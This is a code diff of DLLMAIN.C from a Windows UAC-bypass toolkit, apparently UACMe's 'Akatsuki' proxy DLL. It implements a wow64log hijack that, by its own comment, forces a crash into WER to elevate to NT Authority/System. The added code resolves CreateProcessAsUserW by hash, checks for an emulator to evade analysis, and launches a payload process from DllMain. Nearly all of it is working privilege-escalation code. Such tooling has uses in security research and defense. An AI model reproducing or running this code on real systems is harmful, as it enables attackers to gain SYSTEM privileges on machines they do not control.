@@ -1,16 +1,18 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2019
+*  (C) COPYRIGHT AUTHORS, 2016 - 2020
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.50
 *
-*  DATE:        20 Mar 2019
+*  DATE:        14 Sep 2020
 *
 *  Proxy dll entry point, Akatsuki.
 *  Special dll for wow64 logger method.
-*  Akatsuki must be special, isn't it?
+* 
+*  WARNING: real wow64log must have native subsystem and only ntdll export.
+*  This one will force crash and propagate to WER process elevating to NTAuthority/System.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -91,6 +93,44 @@ VOID DbgDumpRuntimeInfo()
     }
 }
 
+#define Hash_CreateProcessAsUserW 0xb75be93c
+
+/*
+* InitFunctionPtr
+*
+* Purpose:
+*
+* Retrieve required function ptr.
+*
+*/
+PVOID InitFunctionPtr(
+    VOID
+)
+{
+    UNICODE_STRING usKernel = RTL_CONSTANT_STRING(L"kernel32.dll");
+    UNICODE_STRING usAdvapi = RTL_CONSTANT_STRING(L"advapi32.dll");
+
+    NTSTATUS ntStatus;
+    PVOID ImageBase = NULL, dummy;
+
+    ntStatus = LdrLoadDll(NULL, NULL, &usKernel, &dummy);
+    if (NT_SUCCESS(ntStatus)) {
+
+        ntStatus = LdrGetDllHandleEx(LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT,
+            NULL, NULL, &usAdvapi, &ImageBase);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            ntStatus = LdrLoadDll(NULL, NULL, &usAdvapi, &ImageBase);
+        }
+
+        if (NT_SUCCESS(ntStatus)) {
+            return ucmGetProcedureAddressByHash(ImageBase, Hash_CreateProcessAsUserW);
+        }
+    }
+
+    return NULL;
+}
+
 /*
 * DefaultPayload
 *
@@ -104,15 +144,21 @@ VOID DefaultPayload(
 )
 {
     BOOL bSharedParamsReadOk;
-    UINT ExitCode;
+    UINT ExitCode = 0;
     PWSTR lpParameter;
     ULONG cbParameter;
 
     BOOL bIsLocalSystem = FALSE;
     ULONG SessionId;
 
-    if (ucmCreateSyncMutant(&g_SyncMutant) == STATUS_OBJECT_NAME_COLLISION)
-        ExitProcess(0);
+    LARGE_INTEGER liDueTime;
+
+    PFNCREATEPROCESSASUSERW pCreateProcessAsUser;
+
+    if (!NT_SUCCESS(ucmCreateSyncMutant(&g_SyncMutant))) {
+        RtlExitUserProcess(STATUS_SUCCESS);
+        return;
+    }
 
     //
     // Read shared params block.
@@ -132,12 +178,18 @@ VOID DefaultPayload(
 
     ucmIsLocalSystem(&bIsLocalSystem);
 
-    ExitCode = (ucmLaunchPayload2(
-        bIsLocalSystem, 
-        SessionId, 
-        lpParameter, 
-        cbParameter) != FALSE);
+    pCreateProcessAsUser = (PFNCREATEPROCESSASUSERW)InitFunctionPtr();
 
+    if (pCreateProcessAsUser) {
+
+        ExitCode = (ucmLaunchPayload2(
+            pCreateProcessAsUser,
+            bIsLocalSystem,
+            SessionId,
+            lpParameter,
+            cbParameter) != FALSE);
+
+    }
     //
     // Notify Akagi.
     //
@@ -145,7 +197,11 @@ VOID DefaultPayload(
         ucmSetCompletion(g_SharedParams.szSignalObject);
     }
 
-    ExitProcess(ExitCode);
+    ucmFormatTimeOut(&liDueTime, 5000);
+    NtDelayExecution(FALSE, &liDueTime);
+    NtClose(g_SyncMutant);
+
+    RtlExitUserProcess(ExitCode);
 }
 
 /*
@@ -165,13 +221,16 @@ BOOL WINAPI DllMain(
     UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
 
+    ucmDbgMsg(LoadedMsg);
+
     if (wdIsEmulatorPresent() == STATUS_NEEDS_REMEDIATION)
-        ExitProcess('Foff');
+        RtlExitUserProcess('Foff');
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        OutputDebugString(LoadedMsg);
-        //DbgDumpRuntimeInfo();
+
+        LdrDisableThreadCalloutsForDll(hinstDLL);      
         DefaultPayload();
+
     }
     return TRUE;
 }
